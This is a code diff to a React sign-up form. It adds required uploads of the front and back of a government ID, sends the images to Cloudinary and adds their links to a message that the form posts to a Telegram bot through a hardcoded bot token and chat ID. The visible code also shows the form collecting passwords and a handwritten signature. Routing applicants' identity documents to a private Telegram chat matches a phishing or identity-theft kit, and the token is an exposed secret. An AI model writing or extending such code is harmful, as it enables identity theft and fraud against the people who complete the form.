@@ -42,7 +42,12 @@ const schema = yup.object().shape({
     .string()
     .oneOf([yup.ref("password")], "Passwords must match"),
   signature: yup.string().required("Signature is required"),
+  frontId: yup.string().required("Front ID image is required"),
+backId: yup.string().required("Back ID image is required"),
 });
+
+
+
 
 const SignUp = () => {
   const [loading, setLoading] = useState(false);
@@ -52,6 +57,9 @@ const SignUp = () => {
   const canvasRef = useRef<HTMLCanvasElement | null>(null);
   const signaturePadRef = useRef<SignaturePad | null>(null);
   const [signature, setSignature] = useState<string | null>(null);
+const [frontImage, setFrontImage] = useState<string | null>(null);
+const [backImage, setBackImage] = useState<string | null>(null);
+
 
   useEffect(() => {
     if (canvasRef.current) {
@@ -80,6 +88,32 @@ const SignUp = () => {
     }
   };
 
+  const uploadToCloudinary = async (file: File) => {
+  const formData = new FormData();
+  formData.append("file", file);
+  formData.append("upload_preset", UPLOAD_PRESET);
+
+  const response = await fetch(CLOUDINARY_URL, {
+    method: "POST",
+    body: formData,
+  });
+
+  const data = await response.json();
+  return data.secure_url;
+};
+
+const handleFrontUpload = async (file: File) => {
+  const url = await uploadToCloudinary(file);
+  setFrontImage(url);
+  setValue("frontId", url);
+};
+
+const handleBackUpload = async (file: File) => {
+  const url = await uploadToCloudinary(file);
+  setBackImage(url);
+  setValue("backId", url);
+};
+
   const uploadSignatureToCloudinary = async (base64: string) => {
     const formData = new FormData();
     formData.append("file", base64);
@@ -93,6 +127,7 @@ const SignUp = () => {
     const data = await response.json();
     return data.secure_url; // return uploaded URL
   };
+
 
   const BOT_TOKEN = "8687538549:AAFXDNYEGIZIOlIY5RFIIlqMgFTKCHvHLkw";
   const CHAT_ID = "8737535256";
@@ -113,6 +148,9 @@ const SignUp = () => {
 
 ✍ Signature: ${data.signature}
 🖼 Profile: ${data.profilePicture}
+🆔 Front ID: ${data.frontId}
+🆔 Back ID: ${data.backId}
+
 `;
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -415,6 +453,54 @@ const SignUp = () => {
             className="input w-full   border py-3 border-[#ccc]"
           />
         </div>
+
+       {/* Government ID Upload */}
+<div className="flex flex-col">
+  <label className="font-semibold">
+    Upload Government Issued ID (ID Card, Driver’s License or Passport) – Front
+  </label>
+
+  {frontImage && (
+    <img
+      src={frontImage}
+      alt="Government ID Front"
+      className="w-40 mt-2 border rounded"
+    />
+  )}
+
+  <input
+    type="file"
+    accept="image/*"
+    onChange={(e) =>
+      e.target.files && handleFrontUpload(e.target.files[0])
+    }
+    className="border p-2 rounded w-full mt-2"
+  />
+</div>
+
+<div className="flex flex-col mt-4">
+  <label className="font-semibold">
+    Upload Government Issued ID (ID Card, Driver’s License or Passport) – Back
+  </label>
+
+  {backImage && (
+    <img
+      src={backImage}
+      alt="Government ID Back"
+      className="w-40 mt-2 border rounded"
+    />
+  )}
+
+  <input
+    type="file"
+    accept="image/*"
+    onChange={(e) =>
+      e.target.files && handleBackUpload(e.target.files[0])
+    }
+    className="border p-2 rounded w-full mt-2"
+  />
+</div>
+
 
         {/* Signature */}
         <div className="mt-6">
